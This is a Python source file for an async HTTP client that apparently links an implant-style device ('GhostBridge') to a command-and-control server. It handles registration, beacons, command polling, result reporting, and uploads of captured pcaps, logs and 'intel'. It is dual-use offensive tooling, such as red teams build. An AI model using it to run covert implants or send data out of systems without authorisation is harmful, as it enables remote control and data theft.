"""
MoMo API Client

Async HTTP client for C2 communication.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from datetime import datetime
from typing import Any, Optional

import httpx

logger = logging.getLogger(__name__)


@dataclass
class Command:
    """Command received from C2."""

    id: str
    action: str
    payload: dict[str, Any]
    timestamp: datetime

    @classmethod
    def from_dict(cls, data: dict) -> Command:
        """Create Command from dictionary."""
        return cls(
            id=data["command_id"],
            action=data["action"],
            payload=data.get("payload", {}),
            timestamp=datetime.fromisoformat(data.get("timestamp", datetime.now().isoformat())),
        )


@dataclass
class CommandResponse:
    """Response to send back to C2."""

    command_id: str
    status: str  # "success", "error", "pending"
    result: Any
    error: Optional[str] = None

    def to_dict(self) -> dict:
        """Convert to dictionary for API."""
        data = {
            "command_id": self.command_id,
            "status": self.status,
            "result": self.result,
            "timestamp": datetime.now().isoformat(),
        }
        if self.error:
            data["error"] = self.error
        return data


class MoMoClientError(Exception):
    """MoMo API client error."""

    pass


class MoMoClient:
    """
    Async HTTP client for MoMo C2 API.

    Provides:
    - Device registration
    - Beacon/heartbeat
    - Command retrieval
    - Response submission
    - Data upload
    """

    def __init__(
        self,
        api_endpoint: str,
        device_id: str,
        timeout: float = 30.0,
        verify_ssl: bool = True,
    ):
        """
        Initialize MoMo client.

        Args:
            api_endpoint: Base API URL
            device_id: This device's identifier
            timeout: Request timeout in seconds
            verify_ssl: Verify SSL certificates
        """
        self.api_endpoint = api_endpoint.rstrip("/")
        self.device_id = device_id
        self.timeout = timeout
        self.verify_ssl = verify_ssl

        self._client: Optional[httpx.AsyncClient] = None

    async def __aenter__(self) -> MoMoClient:
        """Async context manager entry."""
        await self._ensure_client()
        return self

    async def __aexit__(self, *args: Any) -> None:
        """Async context manager exit."""
        await self.close()

    async def _ensure_client(self) -> httpx.AsyncClient:
        """Ensure HTTP client is initialized."""
        if self._client is None:
            self._client = httpx.AsyncClient(
                timeout=self.timeout,
                verify=self.verify_ssl,
                headers={
                    "User-Agent": "GhostBridge/0.2.0",
                    "X-Device-ID": self.device_id,
                },
            )
        return self._client

    async def close(self) -> None:
        """Close HTTP client."""
        if self._client is not None:
            await self._client.aclose()
            self._client = None

    async def _request(
        self,
        method: str,
        endpoint: str,
        json: Optional[dict] = None,
        **kwargs: Any,
    ) -> dict:
        """
        Make API request.

        Args:
            method: HTTP method
            endpoint: API endpoint path
            json: JSON body
            **kwargs: Additional httpx arguments

        Returns:
            Response JSON

        Raises:
            MoMoClientError: On request failure
        """
        client = await self._ensure_client()
        url = f"{self.api_endpoint}{endpoint}"

        try:
            response = await client.request(method, url, json=json, **kwargs)
            response.raise_for_status()
            return response.json()

        except httpx.HTTPStatusError as e:
            raise MoMoClientError(f"API error {e.response.status_code}: {e.response.text}")
        except httpx.RequestError as e:
            raise MoMoClientError(f"Request failed: {e}")

    async def register(self, name: str, metadata: Optional[dict] = None) -> dict:
        """
        Register device with C2.

        Args:
            name: Device name
            metadata: Additional device metadata

        Returns:
            Registration response
        """
        data = {
            "device_id": self.device_id,
            "name": name,
            "type": "ghostbridge",
            "version": "0.2.0",
            "metadata": metadata or {},
        }

        logger.info(f"Registering device: {self.device_id}")
        return await self._request("POST", "/register", json=data)

    async def beacon(
        self,
        status: str = "active",
        tunnel_status: str = "connected",
        uptime: float = 0,
        network_info: Optional[dict] = None,
        system_info: Optional[dict] = None,
    ) -> dict:
        """
        Send heartbeat beacon to C2.

        Args:
            status: Device status
            tunnel_status: Tunnel connection status
            uptime: Device uptime in seconds
            network_info: Network statistics
            system_info: System metrics

        Returns:
            Beacon response (may include commands)
        """
        data = {
            "device_id": self.device_id,
            "timestamp": datetime.now().isoformat(),
            "status": status,
            "tunnel_status": tunnel_status,
            "uptime_seconds": uptime,
            "network_info": network_info or {},
            "system_info": system_info or {},
        }

        logger.debug(f"Sending beacon: status={status}")
        return await self._request("POST", "/beacon", json=data)

    async def get_commands(self) -> list[Command]:
        """
        Get pending commands from C2.

        Returns:
            List of pending commands
        """
        response = await self._request(
            "GET",
            "/commands",
            params={"device_id": self.device_id},
        )

        commands = []
        for cmd_data in response.get("commands", []):
            try:
                commands.append(Command.from_dict(cmd_data))
            except (KeyError, ValueError) as e:
                logger.warning(f"Invalid command data: {e}")

        return commands

    async def send_response(self, response: CommandResponse) -> dict:
        """
        Send command response to C2.

        Args:
            response: Command execution response

        Returns:
            API response
        """
        data = {
            "device_id": self.device_id,
            **response.to_dict(),
        }

        logger.debug(f"Sending response for command {response.command_id}")
        return await self._request("POST", "/response", json=data)

    async def upload_data(
        self,
        data_type: str,
        content: bytes,
        filename: Optional[str] = None,
        metadata: Optional[dict] = None,
    ) -> dict:
        """
        Upload data/file to C2.

        Args:
            data_type: Type of data (pcap, log, intel, etc.)
            content: Binary content
            filename: Optional filename
            metadata: Additional metadata

        Returns:
            Upload response
        """
        import base64

        data = {
            "device_id": self.device_id,
            "data_type": data_type,
            "content": base64.b64encode(content).decode(),
            "filename": filename,
            "metadata": metadata or {},
            "timestamp": datetime.now().isoformat(),
        }

        logger.info(f"Uploading {data_type}: {len(content)} bytes")
        return await self._request("POST", "/upload", json=data)

    async def get_config(self) -> dict:
        """
        Get device configuration from C2.

        Returns:
            Configuration dictionary
        """
        response = await self._request(
            "GET",
            "/config",
            params={"device_id": self.device_id},
        )
        return response.get("config", {})

    async def ping(self) -> bool:
        """
        Check C2 connectivity.

        Returns:
            True if C2 is reachable
        """
        try:
            await self._request("GET", "/ping")
            return True
        except MoMoClientError:
            return False

